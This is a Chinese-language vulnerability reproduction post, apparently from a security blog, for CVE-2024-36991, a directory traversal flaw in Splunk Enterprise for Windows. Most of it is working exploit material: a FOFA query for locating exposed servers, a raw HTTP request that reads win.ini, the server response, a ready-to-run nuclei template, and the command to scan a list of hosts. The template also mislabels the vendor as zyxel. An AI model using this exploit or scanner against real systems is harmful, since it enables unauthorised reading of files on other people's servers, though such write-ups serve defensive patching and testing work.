#  CVE-2024-36991 漏洞复现 POC   
原创 fgz  AI与网安   2024-07-06 11:29  
  
免  
责  
申  
明  
：**本文内容为学习笔记分享，仅供技术学习参考，请勿用作违法用途，任何个人和组织利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责，与作者无关！！！**  
  
  
  
01  
  
—  
  
漏洞名称  
  
  
  
Splunk Enterprise for Windows 任意文件读取漏洞  
  
  
  
02  
  
—  
  
影响范围  
  
  
影响范围  
  
9.2.0 <= Splunk Enterprise < 9.2.2  
  
9.1.0 <= Splunk Enterprise < 9.1.5  
  
9.0.0 <= Splunk Enterprise < 9.0.10  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BPMqUib3jyiat75KvlBk317fMxuiceGnXUgy9icS9TMsFTPJzCl5DUyicDHZ4DLLcVZfm6w5AicVH50xQMw/640?wx_fmt=png&from=appmsg "")  
  
  
  
03  
  
—  
  
漏洞描述  
  
  
Splunk Enterprise 是一款强大的数据分析软件，它允许用户从各种来源收集、索引和搜索机器生成的数据。  
2024年7月，官方发布安全通告，披露 CVE-2024-36991 Splunk Enterprise Windows平台 modules/messaging 目录遍历漏洞。  
漏洞仅影响 Windows平台上的 Splunk Enterprise，官方已发布安全更新，建议升级至最新版本。  
  
  
04  
  
—  
  
FOFA搜索语句  
  
  
```
app="splunk-Enterprise"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BPMqUib3jyiat75KvlBk317fMPgbE6yOlsHYUIib1uLBXRvDDh2lgxGHtiaL4PMAfEKSTraPUJzqLwtuQ/640?wx_fmt=png&from=appmsg "")  
  
  
05  
  
—  
  
漏洞复现  
  
  
向靶场发送如下数据包读取  
/windows/win.ini文件  
```
GET /en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../windows/win.ini HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```  
  
响应内容如下  
```
HTTP/1.1 200 OK
Connection: close
Accept-Ranges: bytes
Content-Type: text/html
Date: Sat, 06 Jul 2024 03:23:04 GMT
Last-Modified: Sat, 07 Dec 2019 09:12:42 GMT
Server: Splunkd
Set-Cookie: session_id_8000=e1e84e42c833f84a35dd06aa1b4409c4f3805ee3; expires=Sat, 06 Jul 2024 04:23:04 GMT; HttpOnly; Max-Age=3600; Path=/
Vary: Accept-Encoding, Cookie
X-Content-Type-Options: nosniff

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```  
  
漏洞复现成功  
  
  
  
06  
  
—  
  
nuclei poc  
  
  
poc文件内容如下  
```
id: CVE-2024-36991

info:
  name: Splunk Enterprise for Windows 任意文件读取漏洞
  author: fgz
  severity: high
  description: |
    Splunk Enterprise 是一款强大的数据分析软件，它允许用户从各种来源收集、索引和搜索机器生成的数据。2024年7月，官方发布安全通告，披露 CVE-2024-36991 Splunk Enterprise Windows平台 modules/messaging 目录遍历漏洞。漏洞仅影响 Windows平台上的 Splunk Enterprise，官方已发布安全更新，建议升级至最新版本。
  reference:
    - https://advisory.splunk.com/advisories/SVD-2024-0711
    - https://research.splunk.com/application/e7c2b064-524e-4d65-8002-efce808567aa
  classification:
    cvss-score: 7.1
    cve-id: CVE-2024-36991
  metadata:
    verified: true
    max-request: 1
    vendor: zyxel
    product: Splunk Enterprise
    fofa-query: app="splunk-Enterprise"
  tags: cve,cve2024,splunk-Enterpris

http:
  - raw:
      - |
        GET /en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../windows/win.ini HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - "status_code == 200"
          - "contains(body, '; for 16-bit app support')"
        condition: and

```  
  
运行POC  
```
nuclei.exe  -t CVE-2024-36991.yaml -l 1.txt 
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BPMqUib3jyiat75KvlBk317fM65EmkF4AsSRSaQGsgibibjBKhGicYeP2vh49LGvicMSWTSX9TIbcnjthuA/640?wx_fmt=png&from=appmsg "")  
  
  
  
07  
  
—  
  
修复建议  
  
  
升级到安全版本或者关闭外部攻击面。  
  
  
  
